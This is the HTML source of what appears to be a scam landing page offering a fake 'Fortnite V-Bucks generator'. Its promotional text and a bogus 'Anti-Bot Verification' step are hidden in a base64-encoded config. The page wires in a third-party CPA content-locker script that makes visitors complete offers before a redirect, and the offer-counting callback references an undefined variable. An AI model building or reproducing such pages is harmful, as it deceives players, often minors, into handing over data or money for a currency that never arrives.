
    
   
     <style>
    
    body {
        overflow: hidden;
        height: 100vh;
    }

    #loader {
        position: fixed;
        top:0;
        left:0;
        background: #174d63;
        z-index:1000;
      }

      #loader-wrap {
        width: 100vw;
        height:100vh;
        display: flex;
        flex-direction:column;
        justify-content: center;
        align-content:center;
      }

      .lds-default {
        display: inline-block;
        position: relative;
        width: 80px;
        height: 80px;
        margin: 0 auto;

      }
    .lds-default div {
      position: absolute;
      width: 6px;
      height: 6px;
      background: #fff;
      border-radius: 50%;
      animation: lds-default 1.2s linear infinite;
    }
    .lds-default div:nth-child(1) {
      animation-delay: 0s;
      top: 37px;
      left: 66px;
    }
    .lds-default div:nth-child(2) {
      animation-delay: -0.1s;
      top: 22px;
      left: 62px;
    }
    .lds-default div:nth-child(3) {
      animation-delay: -0.2s;
      top: 11px;
      left: 52px;
    }
    .lds-default div:nth-child(4) {
      animation-delay: -0.3s;
      top: 7px;
      left: 37px;
    }
    .lds-default div:nth-child(5) {
      animation-delay: -0.4s;
      top: 11px;
      left: 22px;
    }
    .lds-default div:nth-child(6) {
      animation-delay: -0.5s;
      top: 22px;
      left: 11px;
    }
    .lds-default div:nth-child(7) {
      animation-delay: -0.6s;
      top: 37px;
      left: 7px;
    }
    .lds-default div:nth-child(8) {
      animation-delay: -0.7s;
      top: 52px;
      left: 11px;
    }
    .lds-default div:nth-child(9) {
      animation-delay: -0.8s;
      top: 62px;
      left: 22px;
    }
    .lds-default div:nth-child(10) {
      animation-delay: -0.9s;
      top: 66px;
      left: 37px;
    }
    .lds-default div:nth-child(11) {
      animation-delay: -1s;
      top: 62px;
      left: 52px;
    }
    .lds-default div:nth-child(12) {
      animation-delay: -1.1s;
      top: 52px;
      left: 62px;
    }
    @keyframes lds-default {
      0%, 20%, 80%, 100% {
        transform: scale(1);
      }
      50% {
        transform: scale(1.5);
      }
    }

    </style>
    
   
    
    <link href=https://cdn.jsdelivr.net/gh/iDevMore/BuildLPs/Fortnite/1/app1.css rel=preload as=style>
    <link href=https://cdn.jsdelivr.net/gh/iDevMore/BuildLPs/Fortnite/1/app1.js rel=preload as=script>
    
    <link href=https://cdn.jsdelivr.net/gh/iDevMore/BuildLPs/Fortnite/1/app1.css rel=stylesheet>
    
    <link href=https://use.fontawesome.com/releases/v5.8.2/css/all.css rel=stylesheet>
    
    </head><body><div id="loader">
    <div id="loader-wrap">
      <div class="lds-default"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
    </div>
</div>

<noscript><strong>We're sorry but landing doesn't work properly without JavaScript enabled. Please enable it to
    continue.</strong></noscript>
<div id=app></div>

<script>
    var Globals = JSON.parse(atob("eyJjYWxsX3RvX2FjdGlvbiI6IkdFVCBWLUJVQ0tTIiwiZGVzY3JpcHRpb24iOiJGb3J0bml0ZSBWLUJ1Y2tzIGdlbmVyYXRvciBpcyBhIG5ldyB0b29sIHRoYXQgYWxsb3dzIHlvdSB0byBnZXQgZnJlZSBWLUJ1Y2tzIGluIEZvcnRuaXRlLiIsImtleXdvcmRzIjoiRm9ydG5pdGUgRnJlZSBWLUJ1Y2tzLCBWLUJ1Y2tzIEdlbmVyYXRvciwgR2V0IFYtQnVja3MgRnJlZSwgRnJlZSBGb3J0bml0ZSwgRm9ydG5pdGUgQ2hlYXQsIEZvcnRuaXRlIEhhY2ssIFZCdWNrcyBIYWNrIiwibWVudV9oZWFkZXIiOiJTZWxlY3QgQW1vdW50IG9mIFYtQnVja3MiLCJwbGF0Zm9ybV9maWVsZCI6IllvdXIgUGxhdGZvcm0iLCJzZWxlY3RfYnV0dG9uIjoiU2VsZWN0IiwidGl0bGUiOiJGb3J0bml0ZSAyMDIwIFYtQnVja3MgR2VuZXJhdG9yIiwidXNlcm5hbWVfZmllbGQiOiJZb3VyIHVzZXJuYW1lIiwidmVyaWZpY2F0aW9uX2J1dHRvbiI6IlZlcmlmeSBOb3ciLCJ2ZXJpZmljYXRpb25fbmFtZSI6IkFudGktQm90IFZlcmlmaWNhdGlvbiIsInZlcmlmaWNhdGlvbl90aXRsZSI6IlZFUklGSUNBVElPTiIsImxlYWRzX3JlcXVpcmVkIjoiMSIsImNlbnRzX3JlcXVpcmVkIjoiMSIsImZhc3Rlcl9nZW5lcmF0b3IiOiIwIiwib2ZmZXJzX2Ftb3VudCI6IjUiLCJyZWRpcmVjdF91cmwiOiIiLCJnb29nbGVfYW5hbHl0aWNzIjoiVUEtMDAwMDAtMCJ9")),
        currentLeads = 0,
        currentCents = 0;


</script>
<script src=https://cdn.jsdelivr.net/gh/iDevMore/BuildLPs/Fortnite/1/app1.js></script>

 <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-00000-0"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', "UA-00000-0");
</script><script type="text/javascript">var CPABUILDSETTINGS={"it":818754,"key":"c0fe6","construct":false};</script><script src='https://cpabuild.com/public/external/locker.js'></script><script type='text/javascript'>CPABuildCheckForLead();

var leads_required = parseInt(Globals.leads_required);
var cents_required = parseInt(Globals.cents_required);
var redirect_url=Globals.redirect_url;

var CPABuildOffersComplete = function(completions){
    currentLeads = 0;
    currentCents = 0;
    
    for (let i = 0; i<completions.length; i++){
        currentLeads++;
        currentCents += parseInt(completion.points);
    }
   
    if(currentLeads < leads_required){
        //Needs more leads
        
         }
    else if(currentCents < cents_required){
        //Needs more cents
       
           }
    else{
        //All Requirements met!
       
          window.location.replace(redirect_url);
        
    }
    
    
}</script>
</body>
